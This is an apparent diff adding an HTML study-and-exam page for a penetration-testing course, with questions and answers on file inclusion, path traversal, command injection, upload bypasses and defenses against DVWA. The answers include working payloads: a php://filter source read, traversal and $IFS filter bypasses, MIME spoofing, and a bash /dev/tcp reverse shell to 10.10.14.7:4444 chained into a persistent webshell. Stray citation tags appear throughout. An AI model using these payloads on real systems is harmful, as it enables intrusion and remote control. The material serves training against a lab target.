@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Week 6 - Questions &amp; Exam Mode</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@600;800&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#090d16;--card:#111827;--hover:#162032;--text:#f8fafc;--muted:#94a3b8;--border:rgba(255,255,255,.1);--ok:#10b981;--bad:#f43f5e}
+[data-theme="light"]{--bg:#f8fafc;--card:#fff;--hover:#f1f5f9;--text:#0f172a;--muted:#475569;--border:rgba(0,0,0,.1)}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'Plus Jakarta Sans',system-ui,sans-serif;line-height:1.6;min-height:100vh;overflow-x:hidden}
+header{max-width:900px;margin:0 auto;padding:56px 24px 16px;position:relative}
+.badge{display:inline-block;font-size:11px;font-weight:800;letter-spacing:.6px;text-transform:uppercase;padding:4px 12px;border-radius:20px;background:rgba(59,130,246,.15);color:#3b82f6;border:1px solid rgba(59,130,246,.3)}
+h1{font-size:clamp(26px,6vw,38px);font-weight:800;margin:14px 0 8px;line-height:1.2}
+h1 span{background:linear-gradient(135deg,#3b82f6,#06b6d4);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.sub{color:var(--muted)}
+.top{position:absolute;top:20px;right:24px;display:flex;gap:8px}
+.top button,.top a{width:44px;height:44px;background:var(--card);color:var(--text);border:1px solid var(--border);border-radius:10px;cursor:pointer;font-size:18px;text-decoration:none;display:flex;align-items:center;justify-content:center}
+.modes{max-width:900px;margin:0 auto;padding:8px 24px;display:flex;gap:10px;flex-wrap:wrap}
+.btn{font:inherit;font-weight:700;font-size:14px;padding:10px 18px;border-radius:10px;border:1px solid var(--border);background:var(--card);color:var(--text);cursor:pointer}
+.btn.on,.btn.primary{background:#3b82f6;color:#fff;border-color:#3b82f6}
+main{max-width:900px;margin:0 auto;padding:8px 24px 56px}
+h2.part{font-family:'JetBrains Mono',monospace;font-size:13px;color:#3b82f6;text-transform:uppercase;letter-spacing:1px;margin:28px 0 10px}
+.q{background:var(--card);border:1px solid var(--border);border-top:3px solid var(--c,#3b82f6);border-radius:16px;padding:20px;margin-bottom:16px}
+.mcq{--c:#3b82f6}.tf{--c:#a855f7}.sa{--c:#f59e0b}.sc{--c:#06b6d4}
+.meta{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:800;color:var(--c);margin-bottom:8px}
+.qt{font-weight:600;margin-bottom:12px;overflow-wrap:anywhere}
+.opt{display:flex;gap:10px;align-items:flex-start;padding:10px 12px;border:1px solid var(--border);border-radius:10px;margin-bottom:8px;cursor:pointer;background:var(--hover)}
+.opt input{margin-top:5px}
+.opt.right{border-color:var(--ok);background:rgba(16,185,129,.15)}
+.opt.wrong{border-color:var(--bad);background:rgba(244,63,94,.15)}
+.ans{margin-top:12px;padding:12px 14px;border-left:3px solid var(--ok);background:rgba(16,185,129,.08);border-radius:8px;font-size:14px}
+.ans p+p,.ans ul{margin-top:8px}.ans ul{padding-left:20px}
+.scn{background:var(--hover);border-radius:10px;padding:14px;margin-bottom:14px;font-size:14px;color:var(--muted)}
+.sub-h{font-weight:800;margin:6px 0}
+#bar{max-width:900px;margin:0 auto;padding:0 24px 8px}
+#result{display:none;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:20px;margin-bottom:16px;font-weight:700}
+.hide{display:none!important}
+.timer{font-family:'JetBrains Mono',monospace;color:var(--muted);align-self:center}
+footer{text-align:center;padding:24px 16px;color:var(--muted);font-size:13px;border-top:1px solid var(--border)}
+@media(max-width:600px){header{padding:72px 16px 12px}.modes,main,#bar{padding-left:16px;padding-right:16px}.top{top:16px;right:16px}}
+</style>
+</head>
+<body>
+<header>
+  <div class="top"><a href="index.html" aria-label="Home">&#8962;</a><button id="theme" aria-label="Toggle theme">&#9788;</button></div>
+  <span class="badge">Week 6 &middot; CCY4202</span>
+  <h1><span>Week 6</span> Questions</h1>
+  <p class="sub">Study Mode shows every question with its answer. Exam Mode quizzes you on the MCQ and True/False questions.</p>
+</header>
+<div class="modes">
+  <button class="btn on" id="bStudy">Study Mode</button>
+  <button class="btn" id="bExam">Exam Mode (MCQ + T/F)</button>
+  <span class="timer hide" id="timer"></span>
+</div>
+<div id="bar"></div>
+<main id="app"></main>
+<footer>&copy; Zaneso &mdash; Penetration Testing Course Notes</footer>
+<script>
+const D={"Q": [
+{"part": "Part 1 - File Inclusion", "n": "Q1", "type": "mcq", "label": "Q1 \u00b7 Multiple Choice (MCQ)", "tag": "SINGLE ANSWER", "q": "Which PHP include-family function halts the script with a fatal error if the target file is missing?[cite: 16]", "opts": ["include()", "include_once()", "require()", "readfile()"], "ans": 2, "ansText": "Answer: C - require() (require_once() also halts; include() and include_once() only emit a warning).[cite: 16]"},
+{"part": "Part 1 - File Inclusion", "n": "Q2", "type": "tf", "label": "Q2 \u00b7 True or False", "tag": "BINARY", "q": "With allow_url_include = Off, remote file inclusion (RFI) is impossible against remote URLs.[cite: 16]", "ans": true, "ansText": "Answer: True - PHP refuses to fetch remote URLs through include-family functions when this setting is Off; the include is treated as a local path.[cite: 16]"},
+{"part": "Part 1 - File Inclusion", "n": "Q3", "type": "sa", "label": "Q3 \u00b7 Short Answer", "tag": "FREE RESPONSE", "q": "Why is php://filter/convert.base64-encode/resource=config.php useful in an LFI attack?[cite: 16]", "ansText": "Model answer: The wrapper reads the target file's source, base64-encodes it, and returns the encoded string as text so the PHP body is printed instead of executed. Decoding the base64 then yields the raw source of config.php, typically exposing database credentials and other secrets without ever executing the file.[cite: 16]"},
+{"part": "Part 2 - Path Traversal", "n": "Q1", "type": "mcq", "label": "Q1 \u00b7 Multiple Choice (MCQ)", "tag": "SINGLE ANSWER", "q": "Which payload bypasses a single non-recursive strip of ../?[cite: 17]", "opts": ["../../../etc/passwd", "....//...//etc/passwd", "..%2f..%2fetc%2fpasswd", "/etc/passwd"], "ans": 1, "ansText": "Answer: B - ....//....//etc/passwd. The non-recursive strip removes the inner \"../\", leaving the surrounding characters to recombine into a fresh \"../\". (D would also work as an absolute path, but B is the textbook recursive-strip bypass.)[cite: 17]"},
+{"part": "Part 2 - Path Traversal", "n": "Q2", "type": "tf", "label": "Q2 \u00b7 True or False", "tag": "BINARY", "q": "Blacklisting the literal string ../ is sufficient to prevent path traversal.[cite: 17]", "ans": false, "ansText": "Answer: False - encodings (%2e%2e%2f, double-encoding), recursive-strip bypasses (....//), mixed separators, and absolute paths (/etc/passwd) all defeat a literal blacklist.[cite: 17]"},
+{"part": "Part 2 - Path Traversal", "n": "Q3", "type": "sa", "label": "Q3 \u00b7 Short Answer", "tag": "FREE RESPONSE", "q": "Explain one encoding-based path-traversal bypass and why it works.[cite: 17]", "ansText": "Model answer: %2e%2e%2f is the single-URL-encoded form of ../. If the application filters for the literal string ../ but URL-decodes the input after filtering (or passes it to a function that decodes internally), the encoded form slips through the filter and is later decoded into ../ at the point of use, allowing traversal. The root cause is the filter and the consumer seeing different representations of the same input.[cite: 17]"},
+{"part": "Part 3 - Command Injection", "n": "Q1", "type": "mcq", "label": "Q1 \u00b7 Multiple Choice (MCQ)", "tag": "SINGLE ANSWER", "q": "Which operator runs the second command only if the first command succeeds?[cite: 18]", "opts": [";", "&&", "||", "|"], "ans": 1, "ansText": "Answer: B - && (conditional AND). ; is unconditional, || is on failure, | is a pipe.[cite: 18]"},
+{"part": "Part 3 - Command Injection", "n": "Q2", "type": "tf", "label": "Q2 \u00b7 True or False", "tag": "BINARY", "q": "Blind command injection cannot be used to obtain an interactive reverse shell.[cite: 18]", "ans": false, "ansText": "Answer: False - even with no visible output, the injected command still runs. A reverse-shell payload (e.g. bash -i >& /dev/tcp/.../4444 0>&1) calls back to the attacker regardless of whether the page reflects its output.[cite: 18]"},
+{"part": "Part 3 - Command Injection", "n": "Q3", "type": "sa", "label": "Q3 \u00b7 Short Answer", "tag": "FREE RESPONSE", "q": "How does cat$IFS/etc/passwd bypass a filter that blocks the space character?[cite: 18]", "ansText": "Model answer: $IFS is the shell's Internal Field Separator variable, whose default value is a space, tab, and newline. When the shell evaluates cat$IFS/etc/passwd it expands $IFS to a whitespace separator that is functionally identical to a literal space so the command runs as cat /etc/passwd without the literal space character that the WAF filters on.[cite: 18]"},
+{"part": "Part 4 - File Upload", "n": "Q1", "type": "mcq", "label": "Q1 \u00b7 Multiple Choice (MCQ)", "tag": "SINGLE ANSWER", "q": "Which bypass works against DVWA Medium's Content-Type check?[cite: 19]", "opts": ["Direct upload of shell.php", "Spoof the inner Content-Type to image/jpeg via Burp Repeater, keep PHP body", "Prepend GIF89a; magic bytes", "Use a double extension shell.php.jpg"], "ans": 1, "ansText": "Answer: B - Content-Type spoof via Burp Repeater. The Medium check reads the client-supplied MIME header, so flipping it to image/jpeg passes the check while the PHP body is preserved. (C and D are High-level bypasses.)[cite: 19]"},
+{"part": "Part 4 - File Upload", "n": "Q2", "type": "tf", "label": "Q2 \u00b7 True or False", "tag": "BINARY", "q": "A server that does not enable double-extension execution will still execute shell.php.jpg as PHP.[cite: 19]", "ans": false, "ansText": "Answer: False - by default Apache uses the last extension (.jpg) and serves the file as an image. Without an explicit Apache AddHandler / .htaccess rule listing .php for double extensions, the file will not be parsed as PHP the attacker then needs to rename it (e.g. via the webshell) to shell.php.[cite: 19]"},
+{"part": "Part 4 - File Upload", "n": "Q3", "type": "sa", "label": "Q3 \u00b7 Short Answer", "tag": "FREE RESPONSE", "q": "Why does prepending GIF89a; bypass the getimagesize() check at DVWA High?[cite: 19]", "ansText": "Model answer: getimagesize() identifies an image by reading its magic bytes the file header that declares the format. GIF89a is a valid GIF magic marker, so the function classifies the file as a GIF and returns image dimensions, satisfying the check. The trailing PHP code is ignored by getimagesize() but is later parsed and executed by the PHP interpreter when the file is requested as PHP, because PHP skips the GIF header bytes (treated as inline text output) and runs the script body that follows.[cite: 19]"},
+{"part": "Part 5 - Defenses", "n": "Q1", "type": "mcq", "label": "Q1 \u00b7 Multiple Choice (MCQ)", "tag": "SINGLE ANSWER", "q": "Which defense is most robust against path traversal?[cite: 20]", "opts": ["Blacklist the literal string ../", "URL-encode the input before use", "Canonicalize the path, then verify it stays within the base directory", "Reject any filename containing a dot"], "ans": 2, "ansText": "Answer: C - canonicalize then verify within base dir. Canonicalization resolves ../, symlinks, and encodings into a single absolute path, which can then be string-compared against the base prefix eliminating the filter-vs-consumer mismatch that blacklists suffer from.[cite: 20]"},
+{"part": "Part 5 - Defenses", "n": "Q2", "type": "tf", "label": "Q2 \u00b7 True or False", "tag": "BINARY", "q": "Storing uploads outside the web root alone fully prevents file-upload RCE.[cite: 20]", "ans": false, "ansText": "Answer: False - outside-web-root storage is necessary but not sufficient. Other layers (server-side content validation, random rename, safe extension, disabled script execution, size limits) are still required; defense-in-depth means stacking orthogonal controls, not relying on one.[cite: 20]"},
+{"part": "Part 5 - Defenses", "n": "Q3", "type": "sa", "label": "Q3 \u00b7 Short Answer", "tag": "FREE RESPONSE", "q": "Name two defense-in-depth layers for file upload beyond \"store outside the web root\".[cite: 20]", "ansText": "Model answer: (1) Server-side content validation re-encode the uploaded image with GD or ImageMagick and reject files that fail to decode cleanly, since this defeats magic-byte spoofing such as GIF89a;. (2) Random rename safe extension server picks a UUID filename and a single whitelisted extension, removing both the attacker's chosen name and any double-extension trick. (A third acceptable layer: disable script execution in the upload directory via php_flag engine off or the nginx equivalent.)[cite: 20]"}
+], "scen": {"title": "Closing Scenario \u2014 Integrated scenario DVWA Medium + unsanitised ping[cite: 21]", "text": "A two-step chain combining an upload bypass with command injection.\nSetup:\nTarget: DVWA, security level = Medium\nFile Upload module (Medium): the page rejects raw .php files but the Content-Type check is client-side only (header is read from the request, never re-derived from bytes)\n\"Network Diagnostics\" page: a separate module that runs ping -c 4 <input> via shell_exec() with no sanitisation on $user_input\nGoal: full RCE with an interactive shell on the host, and proof that you can manipulate the upload directory's contents.[cite: 21]", "qs": [
+["Task A", "Upload Bypass", "Describe the exact technique to bypass the Medium upload filter using an intercepting proxy (Burp). What header do you change, and to what?[cite: 21]", "A1 \u2014 Upload bypass via Burp Repeater", "Task A \u00b7 Blue", ["(A) Spoof the part Content-Type header.", "POST /DVWA/vulnerabilities/upload/ (multipart).", "Content-Disposition: form-data; name=\"uploaded\"; filename=\"shell.php\".", "Content-Type: image/jpeg (spoof client MIME; body stays PHP).", "Why: DVWA Medium trusts $_FILES['uploaded']['type'], which PHP populates from the client-supplied part header-we change only that inner header; filename= and the PHP body are untouched, so the file is stored as shell.php.[cite: 22]"], []], 
+["Task B", "Command Injection", "Give a payload that confirms command injection on the diagnostics page, then a payload that escalates to a reverse shell. Specify operator choice and why.[cite: 21]", "A2 \u2014 Confirm command injection & escalate", "Task B \u00b7 Purple", ["(B) Confirm command injection & escalate to reverse shell.", "1. confirm injection (active, output reflected): GET ?ip=127.0.0.1;id \u2192 uid=33(www-data).", "2. attacker listener: nc -lvnp 4444.", "3. escalate (bash /dev/tcp, no nc -e dependency): GET ?ip=127.0.0.1;bash -i >& /dev/tcp/10.10.14.7/4444 0>&1.", "Operator choice: ; runs the payload unconditionally - && would skip the shell if ping fails. bash /dev/tcp beats nc -e because OpenBSD-nc on Debian lacks -e.[cite: 22]"], []], 
+["Task C", "Chaining", "Explain how combining (a) and (b) lets you fully compromise the stored file location - including renaming or repositioning the uploaded file so it executes cleanly as PHP, and what post-exploitation capability you gain.[cite: 21]", "A3 \u2014 Chain - fully compromise the stored file location", "Task C \u00b7 Amber", ["(C) From the reverse shell (as www-data):", "cd /var/www/dvwa/hackable/uploads/", "mv shell.php shell2.php (rename to clean.php or convert double-ext).", "Outcome: persistent, cleanly-named webshell + interactive www-data shell + write access to the upload dir-enabling further staging (Meterpreter uploaded via the same bypass, renamed to .php).", "The chain defeats the Medium MIME check (client-trusted spoof) and the unfiltered ping input (;-chained shell), then promotes a fragile double-extension file into a robust persistent webshell.[cite: 22]"], []]
+]}};
+const r=document.documentElement,s=localStorage.getItem('theme');
+if(s)r.setAttribute('data-theme',s);
+document.getElementById('theme').onclick=()=>{const n=r.getAttribute('data-theme')==='dark'?'light':'dark';r.setAttribute('data-theme',n);localStorage.setItem('theme',n)};
+const app=document.getElementById('app'),bar=document.getElementById('bar'),timer=document.getElementById('timer');
+const L='ABCD';let tick=null;
+const esc=t=>t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+function head(q){return `<div class="meta"><span>${esc(q.label)}</span><span>${esc(q.tag)}</span></div><div class="qt">${esc(q.q)}</div>`}
+function study(){
+  clearInterval(tick);timer.classList.add('hide');bar.innerHTML='';
+  let h='',part='';
+  D.Q.forEach(q=>{
+    if(q.part!==part){part=q.part;h+=`<h2 class="part">${part}</h2>`}
+    h+=`<div class="q ${q.type}">${head(q)}`;
+    if(q.type==='mcq')h+=q.opts.map((o,i)=>`<div class="opt ${i===q.ans?'right':''}"><b>${L[i]}.</b><span>${esc(o)}</span></div>`).join('');
+    h+=`<div class="ans">${esc(q.ansText)}</div></div>`;
+  });
+  if (D.scen && D.scen.qs && D.scen.qs.length > 0) {
+    h+=`<h2 class="part">Integrated Scenario</h2><div class="q sc"><div class="meta"><span>Mock Client Engagement</span><span>~10 min · exam-style</span></div><div class="qt">${esc(D.scen.title)}</div><div class="scn">${esc(D.scen.text)}</div>`;
+    D.scen.qs.forEach(x=>{
+      h+=`<div class="qt"><b>${x[0]} · ${x[1]}</b> — ${esc(x[2])}</div><div class="ans"><div class="sub-h">${esc(x[3])} (${x[4]})</div>`;
+      x[5].forEach(p=>h+=`<p>${esc(p)}</p>`);
+      if(x[6].length)h+=`<ul>${x[6].map(i=>`<li>${esc(i)}</li>`).join('')}</ul>`;
+      if(x[7])h+=`<p>${esc(x[7])}</p>`;
+      h+=`</div>`;
+    });
+    h+=`</div>`;
+  }
+  app.innerHTML=h;
+}
+let ex=[];
+function exam(){
+  clearInterval(tick);
+  ex=D.Q.filter(q=>q.type!=='sa');
+  bar.innerHTML='';
+  let h=`<div id="result"></div>`;
+  ex.forEach((q,k)=>{
+    h+=`<div class="q ${q.type}" id="e${k}"><div class="meta"><span>Question ${k+1} of ${ex.length}</span><span>${q.type==='mcq'?'Multiple Choice':'True or False'}</span></div><div class="qt">${esc(q.q)}</div>`;
+    const opts=q.type==='mcq'?q.opts.map((o,i)=>[i,L[i]+'. '+o]):[[1,'True'],[0,'False']];
+    h+=opts.map(([v,t])=>`<label class="opt"><input type="radio" name="q${k}" value="${v}"><span>${esc(t)}</span></label>`).join('');
+    h+=`<div class="ans hide"></div></div>`;
+  });
+  h+=`<div style="display:flex;gap:10px;flex-wrap:wrap"><button class="btn primary" id="sub">Submit Exam</button><button class="btn" id="rst">Restart</button></div>`;
+  app.innerHTML=h;
+  let t=0;timer.classList.remove('hide');timer.textContent='00:00';
+  tick=setInterval(()=>{t++;timer.textContent=String(Math.floor(t/60)).padStart(2,'0')+':'+String(t%60).padStart(2,'0')},1000);
+  document.getElementById('rst').onclick=exam;
+  document.getElementById('sub').onclick=()=>{
+    clearInterval(tick);let sc=0;
+    ex.forEach((q,k)=>{
+      const box=document.getElementById('e'+k);
+      const c=box.querySelector('input:checked');
+      const correct=q.type==='mcq'?q.ans:(q.ans?1:0);
+      const val=c?+c.value:null;
+      if(val===correct)sc++;
+      box.querySelectorAll('label.opt').forEach(l=>{
+        const v=+l.querySelector('input').value;
+        if(v===correct)l.classList.add('right');
+        else if(v===val)l.classList.add('wrong');
+        l.querySelector('input').disabled=true;
+      });
+      const a=box.querySelector('.ans');a.classList.remove('hide');
+      a.innerHTML=(val===null?'<b>Not answered.</b> ':val===correct?'<b>Correct.</b> ':'<b>Incorrect.</b> ')+esc(q.ansText);
+    });
+    const res=document.getElementById('result');
+    res.style.display='block';
+    res.textContent=`Score: ${sc} / ${ex.length} (${Math.round(sc/ex.length*100)}%) · Time ${timer.textContent}`;
+    document.getElementById('sub').disabled=true;
+    window.scrollTo({top:0,behavior:'smooth'});
+  };
+}
+const bS=document.getElementById('bStudy'),bE=document.getElementById('bExam');
+bS.onclick=()=>{bS.classList.add('on');bE.classList.remove('on');study()};
+bE.onclick=()=>{bE.classList.add('on');bS.classList.remove('on');exam()};
+study();
+</script>
+</body>
+</html>
